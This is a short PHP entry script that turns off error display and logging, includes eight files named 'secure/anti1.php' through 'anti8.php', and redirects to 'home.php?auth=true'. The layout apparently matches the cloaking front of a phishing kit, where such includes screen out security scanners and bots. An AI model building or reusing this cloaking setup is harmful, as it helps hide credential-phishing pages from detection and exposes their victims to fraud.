<?php

       error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
       @ini_set('html_errors','0');
       @ini_set('display_errors','0');
       @ini_set('display_startup_errors','0');
       @ini_set('log_errors','0');
       
                   include 'secure/anti1.php';
                   include 'secure/anti2.php';
                   include 'secure/anti3.php';
                   include 'secure/anti4.php';
                   include 'secure/anti5.php';
                   include 'secure/anti6.php';
                   include 'secure/anti7.php';
                   include 'secure/anti8.php';

       header('Location: home.php?auth=true');

?>
